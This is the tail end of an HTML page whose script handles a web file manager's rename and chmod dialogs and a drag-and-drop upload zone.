document.querySelectorAll('.rename-button').forEach(function(button){button.addEventListener('click',function(){document.getElementById('oldName').value=button.dataset.name;document.getElementById('newName').value=button.dataset.name;document.getElementById('renameDialog').showModal();document.getElementById('newName').focus();});});
document.querySelectorAll('.chmod-button').forEach(function(button){button.addEventListener('click',function(){document.getElementById('chmodTarget').value=button.dataset.name;document.getElementById('permission').value=button.dataset.permission;document.getElementById('chmodDialog').showModal();});});
var dropzone=document.getElementById('dropzone'),uploadInput=document.getElementById('uploadInput');
['dragenter','dragover'].forEach(function(name){dropzone.addEventListener(name,function(event){event.preventDefault();dropzone.classList.add('dragging');});});
['dragleave','drop'].forEach(function(name){dropzone.addEventListener(name,function(event){event.preventDefault();dropzone.classList.remove('dragging');});});
dropzone.addEventListener('drop',function(event){if(event.dataTransfer.files.length)uploadInput.files=event.dataTransfer.files;});
</script>
</body>
</html>
